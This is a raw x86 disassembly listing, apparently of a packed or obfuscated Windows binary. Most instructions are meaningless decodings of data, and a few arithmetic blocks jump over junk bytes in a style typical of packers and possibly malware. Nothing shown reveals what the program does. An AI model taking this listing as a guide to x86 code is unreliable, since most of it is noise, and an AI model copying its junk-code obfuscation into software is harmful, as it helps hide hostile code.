  4114d9:	mov    ah,0xa2
  4114db:	mov    ecx,DWORD PTR [ebp-0x21]
  4114de:	mov    dl,0x33
  4114e0:	pushf  
  4114e1:	gs js  0x41154d
  4114e4:	imul   edx,DWORD PTR [ebx],0xfffffff3
  4114e7:	pop    esi
  4114e8:	cdq    
  4114e9:	or     ebp,ebp
  4114eb:	jmp    0x8596a1b6
  4114f0:	add    DWORD PTR [ebp-0xbdd4c1a],edx
  4114f6:	cmp    al,0x5d
  4114f8:	dec    eax
  4114f9:	fldcw  WORD PTR [ecx]
  4114fb:	retf   0x252f
  4114fe:	xor    eax,0xecfc6022
  411503:	mov    dl,0xcf
  411505:	mov    ebx,0xb62c76a6
  41150a:	lods   al,BYTE PTR ds:[esi]
  41150b:	loope  0x4114ac
  41150d:	mov    dl,0x30
  41150f:	xor    DWORD PTR [esi+0x2971e44f],0xd7110966
  411519:	add    BYTE PTR [ecx+0x52680b9a],dh
  41151f:	inc    edi
  411520:	xchg   esp,eax
  411521:	jecxz  0x4114ce
  411523:	enter  0x883d,0xa9
  411527:	add    al,0x21
  411529:	out    dx,al
  41152a:	sub    eax,0xf37c6765
  41152f:	and    edi,DWORD PTR [esi]
  411531:	or     ebp,ebp
  411533:	adc    DWORD PTR [ebx+ecx*1],esp
  411536:	popa   
  411537:	sbb    BYTE PTR [edx],dh
  411539:	bound  eax,QWORD PTR [edx]
  41153b:	test   eax,0x5dc0b57f
  411540:	inc    esi
  411541:	icebp  
  411542:	es aad 0xb5
  411545:	push   cs
  411546:	jmp    0xdfff1b3f
  41154b:	adc    ebp,DWORD PTR cs:[ecx]
  41154e:	pop    ss
  41154f:	xchg   esi,eax
  411550:	int    0x18
  411552:	imul   ecx,DWORD PTR [esi+0xc],0xc07ff5ea
  411559:	test   al,0x62
  41155b:	add    BYTE PTR [esp+ebp*4],0xf8
  41155f:	inc    eax
  411560:	jmp    0x4114fb
  411562:	mov    al,0x12
  411564:	adc    DWORD PTR [edx+0x47],ebp
  411567:	mov    ah,0x8a
  411569:	jnp    0x4115e9
  41156b:	pop    esp
  41156c:	cmp    DWORD PTR [edi-0x5f],eax
  41156f:	pop    edx
  411570:	stos   DWORD PTR es:[edi],eax
  411571:	mov    dl,0xea
  411573:	mov    BYTE PTR [ebx-0x76],bl
  411576:	cmp    eax,0x2d7851d7
  41157b:	rol    ebp,1
  41157d:	dec    esi
  41157e:	call   0x3d0:0x6d6ae621
  411585:	xor    ebp,DWORD PTR [ebp+0x3d]
  411588:	sahf   
  411589:	mov    WORD PTR [edi+0x6a],gs
  41158c:	xchg   esi,eax
  41158d:	or     dl,bl
  41158f:	icebp  
  411590:	jnp    0x4115bf
  411592:	dec    eax
  411593:	mov    ch,ch
  411595:	(bad)  
  411596:	push   ds
  411597:	lds    esp,FWORD PTR [edx-0x60]
  41159a:	sbb    al,0x13
  41159c:	pop    edx
  41159d:	mov    cs,ecx
  41159f:	and    bl,BYTE PTR ds:0x53306965
  4115a5:	sub    DWORD PTR [eax+0x5b572f9b],ebp
  4115ab:	in     al,0xeb
  4115ad:	adc    bh,BYTE PTR [edx]
  4115af:	jne    0x41154c
  4115b1:	cld    
  4115b2:	int3   
  4115b3:	push   eax
  4115b4:	lea    esi,[esp+edx*2-0x47]
  4115b8:	aas    
  4115b9:	loop   0x411577
  4115bb:	out    0xc3,al
  4115bd:	out    0x4d,al
  4115bf:	mov    DWORD PTR [eax+0x24372e9c],esi
  4115c5:	mov    ch,0x26
  4115c7:	add    eax,0xe78ad975
  4115cc:	xlat   BYTE PTR ds:[ebx]
  4115cd:	stos   DWORD PTR es:[edi],eax
  4115ce:	lds    esi,FWORD PTR [edx-0x19]
  4115d1:	mov    esp,0x4e727388
  4115d6:	test   al,0xf2
  4115d8:	cld    
  4115d9:	jae    0x4115c8
  4115db:	pop    edi
  4115dc:	jle    0x41157a
  4115de:	and    ch,0x8d
  4115e1:	inc    ebp
  4115e2:	test   BYTE PTR [esi-0x6b],bh
  4115e5:	sbb    dh,BYTE PTR [ecx]
  4115e7:	retf   0x35e1
  4115ea:	pop    esp
  4115eb:	(bad)  
  4115ec:	jns    0x411599
  4115ee:	adc    ebp,edi
  4115f0:	sbb    DWORD PTR [esi+ebx*2-0x1c4e7fc1],0xc7769095
  4115fb:	jne    0x411615
  4115fd:	pop    ss
  4115fe:	scas   eax,DWORD PTR es:[edi]
  4115ff:	xor    bl,BYTE PTR [edx+0x6b470143]
  411605:	mov    eax,0xccb29bba
  41160a:	leave  
  41160b:	(bad)  
  41160c:	sti    
  41160d:	xchg   ecx,eax
  41160e:	or     DWORD PTR [esi+0x63f3fc74],ebp
  411614:	and    eax,0xeea084c9
  411619:	jl     0x411628
  41161b:	mov    cl,0x33
  41161d:	popf   
  41161e:	cwde   
  41161f:	sub    esi,DWORD PTR [edx+ebp*2+0xbe057d0]
  411626:	jb     0x411695
  411628:	int3   
  411629:	push   cs
  41162a:	loop   0x4116a9
  41162c:	or     al,0xb3
  41162e:	jo     0x411665
  411630:	or     eax,0xfeb55d6d
  411635:	cmp    al,0x95
  411637:	mov    ch,0x39
  411639:	pop    edx
  41163a:	std    
  41163b:	add    esp,DWORD PTR [ebx+0x38]
  41163e:	lods   eax,DWORD PTR ds:[esi]
  41163f:	cs call 0x5233:0xa033a2ab
  411647:	xor    al,0x66
  411649:	or     eax,0x330a0b0d
  41164e:	xchg   ecx,eax
  41164f:	xor    ebx,edi
  411651:	fsub   QWORD PTR [edx+0x6822328b]
  411657:	sub    BYTE PTR [ecx+0x4e],cl
  41165a:	jge    0x41169b
  41165c:	(bad)  
  41165d:	add    ch,BYTE PTR [esi-0x30]
  411660:	shr    BYTE PTR [ecx],cl
  411662:	inc    esi
  411663:	jle    0x4115eb
  411665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411666:	mov    BYTE PTR [edx-0x3ada9023],cl
  41166c:	sbb    DWORD PTR [esi-0x2474b2df],0x80a134fa
  411676:	pop    edi
  411677:	dec    edx
  411678:	jb     0x411689
  41167a:	inc    esp
  41167b:	mov    esp,0xd1f5e584
  411680:	leave  
  411681:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411682:	xchg   esi,eax
  411683:	push   esi
  411684:	mov    ch,0xf4
  411686:	pop    esp
  411687:	inc    edi
  411688:	bt     DWORD PTR [edx+0x7e],edx
  41168c:	(bad)  
  41168d:	mov    bl,0x63
  41168f:	lods   eax,DWORD PTR ds:[esi]
  411690:	jbe    0x4116a5
  411692:	add    eax,0x58b305f0
  411697:	hlt    
  411698:	add    BYTE PTR [esi-0x667f4b0b],dl
  41169e:	mov    cs:0x6583829e,eax
  4116a4:	mov    al,ds:0xbbc5f0a9
  4116a9:	pop    edi
  4116aa:	push   ecx
  4116ab:	fdivr  QWORD PTR [bx+si-0x4b29]
  4116b0:	icebp  
  4116b1:	mov    eax,ds:0x7cde5282
  4116b6:	stos   BYTE PTR es:[edi],al
  4116b7:	push   eax
  4116b8:	retf   0x8461
  4116bb:	cwde   
  4116bc:	repnz repnz loopne 0x4116c0
  4116c0:	ret    0xc438
  4116c3:	dec    eax
  4116c4:	mov    dh,0xe5
  4116c6:	jecxz  0x41170a
  4116c8:	and    DWORD PTR ds:0x3dbb521f,edx
  4116ce:	xchg   edi,eax
  4116cf:	stos   BYTE PTR es:[edi],al
  4116d0:	popf   
  4116d1:	retf   0x92aa
  4116d4:	pop    eax
  4116d5:	loope  0x41166f
  4116d7:	inc    DWORD PTR [eax]
  4116d9:	retf   0xdeb0
  4116dc:	(bad)  
  4116dd:	shl    ebx,cl
  4116df:	adc    BYTE PTR [ebp+0x5fc4a4eb],bl
  4116e5:	cmp    DWORD PTR [edx],ecx
  4116e7:	adc    al,0x1a
  4116e9:	cdq    
  4116ea:	jle    0x411715
  4116ec:	sbb    edx,DWORD PTR [esp+ebx*4-0x4e]
  4116f0:	sbb    BYTE PTR [esi+0x45],bh
  4116f3:	das    
  4116f4:	sub    DWORD PTR [edx-0x3ff6835f],eax
  4116fa:	shr    bl,1
  4116fc:	(bad)  
  4116fd:	sbb    esp,DWORD PTR [ecx]
  4116ff:	out    0x4d,al
  411701:	cmp    esp,eax
  411703:	sbb    esp,DWORD PTR [edi]
  411705:	mov    ebp,0x623da7fb
  41170a:	pop    ebx
  41170b:	mov    BYTE PTR [ebp+0x1c],0x64
  41170f:	mov    bl,0xfd
  411711:	pusha  
  411712:	and    al,BYTE PTR [ebp+eiz*2-0x59]
  411716:	ins    DWORD PTR es:[edi],dx
  411717:	ins    DWORD PTR es:[edi],dx
  411718:	add    al,cl
  41171a:	std    
  41171b:	sahf   
  41171c:	test   esi,esp
  41171e:	and    al,0x9e
  411720:	push   eax
  411721:	push   ebx
  411722:	ret    0xf407
  411725:	in     eax,0xea
  411727:	cmp    esp,DWORD PTR [ebp+0x1d]
  41172a:	cli    
  41172b:	xchg   DWORD PTR [edi-0x2c648bf1],edi
  411731:	add    BYTE PTR [ecx],cl
  411733:	mov    edx,0x1b3e723
  411738:	xlat   BYTE PTR ds:[ebx]
  411739:	push   ebx
  41173a:	scas   eax,DWORD PTR es:[edi]
  41173b:	shr    DWORD PTR [edx+0x5c],0x7c
  41173f:	test   esp,0xa53455fe
  411745:	outs   dx,DWORD PTR ds:[esi]
  411746:	mov    esp,0x7ba9efb4
  41174b:	xor    al,0x16
  41174d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41174e:	shr    edx,0x33
  411751:	call   0xc13f01da
  411756:	pushf  
  411757:	test   al,0xb1
  411759:	push   edi
  41175a:	cmp    DWORD PTR [ebp+0x63d5784d],esi
  411760:	pop    ebx
  411761:	sbb    eax,0x6d116d7
  411766:	stc    
  411767:	lea    ecx,[ecx-0x27]
  41176a:	mov    ebx,0x886c3e7e
  41176f:	mov    ebp,DWORD PTR [edx+0x3b]
  411772:	and    BYTE PTR [edi-0x43],bl
  411775:	push   edx
  411776:	pop    ebx
  411777:	or     DWORD PTR ds:0x7aa73c0d,0x28
  41177e:	and    al,0x28
  411780:	push   0xae9bbd1c
  411785:	jmp    0xc913fd8d
  41178a:	mov    ch,0xbe
  41178c:	sbb    DWORD PTR [esi-0x5f623bf],0xfffffff3
  411793:	mov    ds:0x985b2120,eax
  411798:	pop    edi
  411799:	sbb    al,0xe8
  41179b:	mov    ds:0xff94ea6c,al
  4117a0:	jmp    0x6f0c3a6a
  4117a5:	jl     0x4117f5
  4117a7:	cmp    al,0xfe
  4117a9:	lods   eax,DWORD PTR ds:[esi]
  4117aa:	pop    ebx
  4117ab:	adc    eax,0x340f6e6
  4117b0:	mov    esi,0x344de507
  4117b5:	call   0xfb6f:0xbbee9d42
  4117bc:	cmp    esi,esi
  4117be:	rcl    DWORD PTR [ebp-0x6a1451b7],1
  4117c4:	pmuludq mm4,QWORD PTR [eax+0x7b85a670]
  4117cb:	cmp    eax,0x970221e7
  4117d0:	xchg   ebp,eax
  4117d1:	mov    ah,0xbb
  4117d3:	mov    ebp,edi
  4117d5:	xchg   edi,eax
  4117d6:	mul    BYTE PTR [ebp-0x5d]
  4117d9:	push   esp
  4117da:	or     BYTE PTR [ecx+0x5754c8d],dh
  4117e0:	jns    0x4117d9
  4117e2:	xchg   ebx,eax
  4117e3:	fdiv   QWORD PTR [ebp+0x2]
  4117e6:	jo     0x4117a9
  4117e8:	addr16 in eax,dx
  4117ea:	adc    BYTE PTR [eax-0x73],dl
  4117ed:	inc    esp
  4117ee:	and    al,0x24
  4117f0:	push   eax
  4117f1:	call   0x40ea8a
  4117f6:	mov    eax,DWORD PTR [esp+0x18]
  4117fa:	mov    ecx,DWORD PTR [esp+0x1c]
  4117fe:	push   DWORD PTR [ebp+0x18]
  411801:	mov    ebx,DWORD PTR [ebp+0xc]
  411804:	push   DWORD PTR [ebp+0x14]
  411807:	mov    esi,DWORD PTR [ebp+0x8]
  41180a:	push   DWORD PTR [ebp+0x10]
  41180d:	push   DWORD PTR [esp+0x20]
  411811:	push   DWORD PTR [esp+0x20]
  411815:	push   DWORD PTR [esp+0x38]
  411819:	push   DWORD PTR [esp+0x38]
  41181d:	call   0x401000
  411822:	pop    esi
  411823:	pop    ebx
  411824:	mov    esp,ebp
  411826:	pop    ebp
  411827:	ret    0x14
  41182a:	push   ebp
  41182b:	mov    ebp,esp
  41182d:	sub    esp,0x1c
  411830:	push   ebx
  411831:	push   esi
  411832:	push   edi
  411833:	mov    DWORD PTR [ebp-0xc],0x6038
  41183a:	mov    DWORD PTR [ebp-0x8],0x5c39
  411841:	mov    DWORD PTR [ebp-0x14],0x1cba
  411848:	jmp    0x411b46
  41184d:	cli    
  41184e:	mov    ch,0x6c
  411850:	inc    edx
  411851:	jge    0x4117e6
  411853:	and    al,0xbd
  411855:	je     0x411804
  411857:	sbb    DWORD PTR [ebp+0x64],eax
  41185a:	je     0x411846
  41185c:	cmp    ebx,DWORD PTR [ebx+0x79bbbb57]
  411862:	mov    edi,0xa981bbbb
  411867:	mov    WORD PTR [ebx],es
  411869:	sub    DWORD PTR [edx+0xfc1af24],ecx
  41186f:	xor    eax,0x8a446c08
  411874:	idiv   BYTE PTR ds:[ebx+ecx*1-0x18271a0e]
  41187c:	outs   dx,BYTE PTR ds:[esi]
  41187d:	jmp    0x5b1b:0x5269c942
  411884:	mov    edi,0xebfbe37a
  411889:	adc    dh,bh
  41188b:	push   ds
  41188c:	jle    0x4118b1
  41188e:	fidiv  WORD PTR [ebp-0x40]
  411891:	jge    0x41183b
  411893:	sub    eax,DWORD PTR [edx-0x46]
  411896:	je     0x411839
  411898:	repz inc ebp
  41189a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41189b:	enter  0xc3a,0x20
  41189f:	mov    bh,0xcf
  4118a1:	pop    ebx
  4118a2:	mov    esp,0x6c941772
  4118a7:	les    eax,FWORD PTR [ebx+0x3]
  4118aa:	rol    DWORD PTR [ebx+0x7958dd0a],0xb3
  4118b1:	rcr    DWORD PTR [edx],0x4a
  4118b4:	jo     0x411852
  4118b6:	mov    dl,0x8
  4118b8:	jbe    0x411939
  4118ba:	lea    ebx,[esi]
  4118bc:	dec    eax
  4118bd:	adc    eax,0x2002eb96
  4118c2:	mov    ebx,0xbefa87dd
  4118c7:	in     eax,0xaf
  4118c9:	xor    ebx,DWORD PTR [eax+0x61]
  4118cc:	sar    DWORD PTR [ebx],0x2
  4118cf:	rol    DWORD PTR [ebp+0x71],cl
  4118d2:	test   al,0xc0
  4118d4:	add    eax,0x4fa9e2a2
  4118d9:	cmc    
  4118da:	addr16 mov al,ds:0x8851
  4118de:	popa   
  4118df:	push   DWORD PTR [edi]
  4118e1:	sbb    ecx,edx
  4118e3:	jge    0x41191a
  4118e5:	add    DWORD PTR ds:0x9fac7cb7,ebp
  4118eb:	test   DWORD PTR [ebx-0x55a39b19],eax
  4118f1:	aas    
  4118f2:	push   edx
  4118f3:	mov    cl,0x38
  4118f5:	stos   BYTE PTR es:[edi],al
  4118f6:	xor    DWORD PTR [edx],ebx
  4118f8:	scas   eax,DWORD PTR es:[edi]
  4118f9:	pop    edx
  4118fa:	mov    ebx,0x49d6869b
  4118ff:	test   eax,0xfec7fdbc
  411904:	mov    ebx,0xdba5df1d
  411909:	mov    edi,0x74c5bcda
  41190e:	adc    DWORD PTR fs:[ebp+ebx*1-0x6a],esi
  411913:	mov    edi,0x93f81e3c
  411918:	or     ch,BYTE PTR [ebp+0x37]
  41191b:	mov    eax,ds:0xc82b92b
  411920:	cmp    al,0x31
  411922:	cmp    bl,BYTE PTR [esi-0x643bb3af]
  411928:	mov    dh,0x42
  41192a:	out    0x88,eax
  41192c:	or     DWORD PTR [ebp+0x30b2deda],esp
  411932:	sub    al,0x73
  411934:	loopne 0x411914
  411936:	lods   al,BYTE PTR ds:[esi]
  411937:	pop    es
  411938:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41193a:	out    dx,eax
  41193b:	iret   
  41193c:	cld    
  41193d:	mov    eax,ds:0xaf060fc4
  411942:	xor    ebp,DWORD PTR [ebx-0x19]
  411945:	xchg   edx,eax
  411946:	aam    0x2c
  411948:	or     ebp,eax
  41194a:	mov    BYTE PTR [eax+0x12],dh
  41194d:	out    dx,eax
  41194e:	adc    edi,DWORD PTR [ebx]
  411950:	fcom   DWORD PTR [ebx+0x2ea92753]
  411956:	or     dl,al
  411958:	imul   esi,DWORD PTR [ebx-0x2b],0x33
  41195c:	or     BYTE PTR [ecx+ecx*1+0x62106d33],bh
  411963:	xchg   ebx,eax
  411964:	sub    bh,BYTE PTR [ecx]
  411966:	xor    eax,0x4629be4b
  41196b:	fdivr  QWORD PTR [ebp+edi*2-0xc5495e5]
  411972:	mov    WORD PTR [eax],?
  411974:	loope  0x411970
  411976:	int    0xaf
  411978:	adc    BYTE PTR [ebp+edi*8+0x49dca880],bh
  41197f:	mov    WORD PTR [ebx+0x28763906],ds
  411985:	push   ss
  411986:	or     DWORD PTR [edx+0x6575ac1e],eax
  41198c:	inc    eax
  41198d:	inc    ecx
  41198e:	pop    ds
  41198f:	pop    edx
  411990:	mov    edi,0x9b7fd51a
  411995:	aad    0x77
  411997:	es xchg esi,eax
  411999:	jmp    0x282dc430
  41199e:	or     eax,0xb3fb2733
  4119a3:	xor    DWORD PTR [esi+ebp*2+0x50],ecx
  4119a7:	mov    ebx,0xcfdd0a53
  4119ac:	sar    BYTE PTR [eax-0x4db7bd56],0xbb
  4119b3:	add    dh,cl
  4119b5:	mov    bl,ch
  4119b7:	pusha  
  4119b8:	jno    0x41198a
  4119ba:	cmp    ecx,esi
  4119bc:	popa   
  4119bd:	push   ebp
  4119be:	pop    ecx
  4119bf:	xor    dh,ah
  4119c1:	mov    edi,0x8fdc6adb
  4119c6:	sbb    BYTE PTR [esi+0x5885f902],bl
  4119cc:	dec    edx
  4119cd:	and    al,0xa2
  4119cf:	loope  0x41198f
  4119d1:	ins    BYTE PTR es:[edi],dx
  4119d2:	in     al,0x44
  4119d4:	cmp    edi,0xc7500916
  4119da:	mov    bl,0xe1
  4119dc:	in     al,0x3a
  4119de:	and    DWORD PTR [ebx-0x22f66120],ebp
  4119e4:	in     eax,dx
  4119e5:	cwde   
  4119e6:	rcl    DWORD PTR [ecx+edi*1-0x4f],1
  4119ea:	sbb    edx,DWORD PTR [esi]
  4119ec:	loope  0x4119e1
  4119ee:	es push 0xe52cd899
  4119f4:	jle    0x4119a3
  4119f6:	aaa    
  4119f7:	or     DWORD PTR cs:[edx+ebx*8],edx
  4119fb:	add    DWORD PTR [ebx+ebx*1],esi
  4119fe:	std    
  4119ff:	leave  
  411a00:	leave  
  411a01:	mov    edx,0xea2caf07
  411a06:	ds jmp 0xbc61:0x6d59884b
  411a0e:	rcr    cl,1
  411a10:	add    al,0xda
  411a12:	fldcw  WORD PTR ds:0x3be1f444
  411a18:	fdivr  DWORD PTR ds:0x76a02221
  411a1e:	push   edi
  411a1f:	imul   BYTE PTR [edi-0x16]
  411a22:	test   cl,al
  411a24:	fs jg  0x411aa5
  411a27:	mov    bl,0xd5
  411a29:	xor    al,0xc7
  411a2b:	pop    esi
  411a2c:	pusha  
  411a2d:	xchg   ecx,eax
  411a2e:	dec    eax
  411a2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a30:	xchg   BYTE PTR ds:0x1afae2ed,ch
  411a36:	mov    eax,0x93a4e2d7
  411a3b:	sbb    edx,eax
  411a3d:	popf   
  411a3e:	out    dx,eax
  411a3f:	sbb    al,0x3b
  411a41:	dec    ebp
  411a42:	lea    edi,[ebx-0x5196b323]
  411a48:	(bad)  
  411a49:	ja     0x4119ec
  411a4b:	cmc    
  411a4c:	mov    edx,0x28c643d4
  411a51:	cli    
  411a52:	dec    edx
  411a53:	inc    ecx
  411a54:	js     0x411a54
  411a56:	xchg   ebx,eax
  411a57:	call   0xe2bf:0x50b4fcf5
  411a5e:	pop    ebx
  411a5f:	inc    esi
  411a60:	sub    BYTE PTR [eax],0xdc
  411a63:	fdiv   DWORD PTR [ebx-0x1c99d407]
  411a69:	sub    cl,BYTE PTR [edx+0x1e]
  411a6c:	mov    bl,0x18
  411a6e:	sbb    ecx,DWORD PTR [edi+0x20]
  411a71:	test   al,0xc7
  411a73:	and    edi,DWORD PTR [ebp-0x6b1bcd02]
  411a79:	(bad)  
  411a7a:	idiv   BYTE PTR ds:0x47c0c51a
  411a80:	and    BYTE PTR [edx+ebx*2-0x4a],al
  411a84:	jl     0x411a6e
  411a86:	dec    eax
  411a87:	or     ecx,0xffffff98
  411a8a:	push   eax
  411a8b:	outs   dx,DWORD PTR ds:[esi]
  411a8c:	or     eax,DWORD PTR ds:0x1ba10a8a
  411a92:	sbb    ebp,ecx
  411a94:	jg     0x411ad8
  411a96:	adc    eax,0x5434bea0
  411a9b:	hlt    
  411a9c:	inc    ebp
  411a9d:	mov    ecx,0x60b910ba
  411aa2:	pushf  
  411aa3:	fadd   st,st(7)
  411aa5:	dec    ebp
  411aa6:	retf   0xe154
  411aa9:	ret    0xcb9e
  411aac:	mov    ds:0xc5f754bc,al
  411ab1:	test   eax,0x79f2b1cb
  411ab6:	mov    ebx,0xb02c4bbe
  411abb:	aad    0x6e
  411abd:	test   al,0xc
  411abf:	xchg   ecx,eax
  411ac0:	and    eax,0xb65e7c90
  411ac5:	mov    ah,0xea
  411ac7:	jns    0x411a6e
  411ac9:	and    dl,BYTE PTR [ebx-0x606c586f]
  411acf:	scas   eax,DWORD PTR es:[edi]
  411ad0:	bound  edx,QWORD PTR [eax]
  411ad2:	dec    ecx
  411ad3:	out    0x1d,al
  411ad5:	mov    bl,0x98
  411ad7:	fbld   TBYTE PTR [esi+0x7f38f6ee]
  411add:	(bad)  
  411adf:	test   al,0x65
  411ae1:	cmp    eax,0xc314aa65
  411ae6:	or     eax,0xa95b968d
  411aeb:	adc    esi,esp
  411aed:	jmp    0x9e96:0xa0dc65d4
  411af4:	outs   dx,BYTE PTR ds:[esi]
  411af5:	jmp    0x4cea1b77
  411afa:	jne    0x411b50
  411afc:	adc    eax,0x6b0add8
  411b01:	in     eax,dx
  411b02:	mov    cl,0xc8
  411b04:	inc    ebp
  411b05:	jecxz  0x411b46
  411b07:	mov    ds:0x47f56582,al
  411b0c:	call   0xfcc7d6e4
  411b11:	cwde   
  411b12:	jbe    0x411b31
  411b14:	jo     0x411aaf
  411b16:	pop    esp
  411b17:	pushf  
  411b18:	cmp    esp,0x429998db
  411b1e:	jno    0x411b29
  411b20:	sub    eax,0x43de98c4
  411b25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b26:	push   0x47091f83
  411b2b:	or     ecx,DWORD PTR [edx]
  411b2d:	pop    esi
  411b2e:	sbb    eax,0xd7e6b04b
  411b33:	and    edi,DWORD PTR [ecx-0x59b9bab5]
  411b39:	dec    BYTE PTR [ebx+0x7591c6d8]
  411b3f:	nop
  411b40:	jmp    0x411ae1
  411b42:	cmp    eax,0xc7d218f7
  411b47:	inc    ebp
  411b48:	lock inc ecx
  411b4a:	jno    0x411b4c
  411b4c:	add    bh,al
  411b4e:	inc    ebp
  411b4f:	in     al,0xba
  411b51:	pop    edi
  411b52:	add    BYTE PTR [eax],al
  411b54:	mov    DWORD PTR [ebp-0x18],0x1bd
  411b5b:	mov    eax,ds:0x422580
  411b60:	mov    ecx,DWORD PTR [ebp-0x8]
  411b63:	or     eax,0x3d07
  411b68:	sub    eax,0x6e
  411b6b:	or     eax,0x5b5b
  411b70:	sub    eax,ecx
  411b72:	mov    ecx,DWORD PTR [ebp-0xc]
  411b75:	imul   ecx,ecx,0x645d46e
  411b7b:	sub    eax,0x9f9
  411b80:	mov    DWORD PTR [ebp-0x4],eax
  411b83:	mov    eax,ds:0x42257c
  411b88:	xor    edx,edx
  411b8a:	xor    ecx,0x1584
  411b90:	or     ecx,eax
  411b92:	mov    eax,0x8eefbff5
  411b97:	div    ecx
  411b99:	mov    ecx,DWORD PTR [ebp+0x10]
  411b9c:	xor    edx,edx
  411b9e:	push   0x3
  411ba0:	pop    esi
  411ba1:	mov    ebx,0x16d4
  411ba6:	mov    edi,0x7b03
  411bab:	sub    ecx,eax
  411bad:	mov    eax,DWORD PTR [ebp-0x10]
  411bb0:	div    esi
  411bb2:	mov    esi,0x3e9e
  411bb7:	mov    edx,eax
  411bb9:	mov    eax,ds:0x422584
  411bbe:	or     edx,ebx
  411bc0:	sub    edx,edi
  411bc2:	or     edx,eax
  411bc4:	mov    eax,DWORD PTR [ebp-0x4]
  411bc7:	sub    eax,edx
  411bc9:	mov    edx,DWORD PTR [ebp-0x14]
  411bcc:	sub    eax,edx
  411bce:	sub    eax,esi
  411bd0:	cmp    eax,ecx
  411bd2:	ja     0x412e7a
  411bd8:	mov    eax,ds:0x422594
  411bdd:	mov    ecx,DWORD PTR ds:0x422590
  411be3:	add    eax,0x55b9
  411be8:	and    ecx,eax
  411bea:	mov    eax,DWORD PTR [ebp-0x4]
  411bed:	add    eax,ecx
  411bef:	mov    ecx,DWORD PTR ds:0x42258c
  411bf5:	sub    eax,ecx
  411bf7:	mov    edx,DWORD PTR [ebp+0xc]
  411bfa:	sub    eax,0x1b71
  411bff:	mov    DWORD PTR [ebp-0x8],eax
  411c02:	mov    eax,DWORD PTR [ebp-0x8]
  411c05:	mov    ecx,DWORD PTR [ebp-0x8]
  411c08:	jmp    0x411f06
  411c0d:	mov    ecx,0x5779d73c
  411c12:	mov    ecx,0xa7113cbd
  411c17:	outs   dx,DWORD PTR ds:[esi]
  411c18:	jno    0x411c3e
  411c1a:	push   ecx
  411c1b:	mov    ebp,0xbb61592f
  411c20:	mov    ebx,0xbbbbbf79
  411c25:	jp     0x411c5a
  411c27:	mov    cl,0x58
  411c29:	outs   dx,DWORD PTR ds:[esi]
  411c2a:	bt     DWORD PTR [esi],edi
  411c2d:	mov    cl,0xe5
  411c2f:	enter  0xa23b,0x4e
  411c33:	sbb    BYTE PTR [edi],al
  411c35:	leave  
  411c36:	sub    edi,DWORD PTR [ebp+0x21]
  411c39:	es pop ds
  411c3b:	cmp    ch,ah
  411c3d:	and    dh,al
  411c3f:	mul    DWORD PTR [ecx-0x5d]
  411c42:	adc    al,0x92
  411c44:	lods   eax,DWORD PTR ds:[esi]
  411c45:	mov    edx,0x6156c730
  411c4a:	or     esi,DWORD PTR [edx-0x40372443]
  411c50:	fs cmp al,0xb2
  411c53:	push   0x46
  411c55:	sahf   
  411c56:	out    0x8d,al
  411c58:	dec    ecx
  411c59:	lods   eax,DWORD PTR ds:[esi]
  411c5a:	inc    edi
  411c5b:	cdq    
  411c5c:	aaa    
  411c5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c5e:	ffreep st(2)
  411c60:	in     eax,dx
  411c61:	cmc    
  411c62:	aas    
  411c63:	pop    es
  411c64:	das    
  411c65:	dec    ebx
  411c66:	push   cs
  411c67:	js     0x411c45
  411c69:	xchg   DWORD PTR [ebx-0x185dfd80],edi
  411c6f:	test   BYTE PTR [edi+0x3f],cl
  411c72:	sbb    DWORD PTR [ebx+ebp*8-0x3046696],ebp
  411c79:	arpl   bp,bx
  411c7b:	es mov ch,0x38
  411c7e:	inc    edx
  411c7f:	clc    
  411c80:	scas   al,BYTE PTR es:[edi]
  411c81:	call   0xd243ed52
  411c86:	sar    BYTE PTR es:0x3e8f100a,0x29
  411c8e:	popf   
  411c8f:	test   ecx,ebp
  411c91:	out    dx,al
  411c92:	mov    cl,0xa0
  411c94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c95:	enter  0x5e84,0x22
  411c99:	sar    dl,0xdd
  411c9c:	inc    edx
  411c9d:	and    eax,0xe8c77819
  411ca2:	mov    ebp,0xe0e604b7
  411ca7:	xor    eax,0x8ccf287b
  411cac:	je     0x411c38
  411cae:	sub    al,0x8
  411cb0:	push   ds
  411cb1:	daa    
  411cb2:	sbb    al,0xe2
  411cb4:	add    BYTE PTR [ecx-0x36e4534],0x3
  411cbb:	add    al,0x2f
  411cbd:	aaa    
  411cbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cbf:	xor    DWORD PTR [ecx+0x31f6b1f],ebp
  411cc5:	iret   
  411cc6:	xor    al,0x49
  411cc8:	jnp    0x411cfa
  411cca:	repnz cmc 
  411ccc:	dec    edx
  411ccd:	inc    esi
  411cce:	cmp    eax,0x640b622c
  411cd3:	call   0x972b4928
  411cd8:	nop
  411cd9:	sbb    BYTE PTR [ebx+eiz*2+0x33],al
  411cdd:	enter  0x2068,0xb2
  411ce1:	lds    eax,FWORD PTR [eax+0x701ada9d]
  411ce7:	or     esi,edx
  411ce9:	sub    ebx,DWORD PTR [edi-0x21]
  411cec:	xchg   ebp,eax
  411ced:	mov    edi,0x606cee74
  411cf2:	sub    cl,BYTE PTR [ebx-0x77]
  411cf5:	retf   0x39c9
  411cf8:	cmp    al,0xfc
  411cfa:	repnz pop ss
  411cfc:	inc    ebp
  411cfd:	pop    ecx
  411cfe:	(bad)  
  411cff:	jmp    0x1acfebec
  411d04:	xchg   ebp,eax
  411d05:	(bad)  
  411d06:	out    0xbe,eax
  411d08:	xor    BYTE PTR [eax-0x48280019],cl
  411d0e:	(bad)  
  411d0f:	mov    al,0xb7
  411d11:	fld    TBYTE PTR [esi+0x6]
  411d14:	xor    DWORD PTR [eiz*8+0xf2cdf98],edx
  411d1b:	dec    ecx
  411d1c:	loope  0x411d53
  411d1e:	push   edi
  411d1f:	mov    ds:0x5db345db,eax
  411d24:	sbb    al,0x5e
  411d26:	aam    0x5d
  411d28:	dec    edx
  411d29:	lods   eax,DWORD PTR ds:[esi]
  411d2a:	stc    
  411d2b:	sbb    ebx,DWORD PTR [ebx-0x73a309ef]
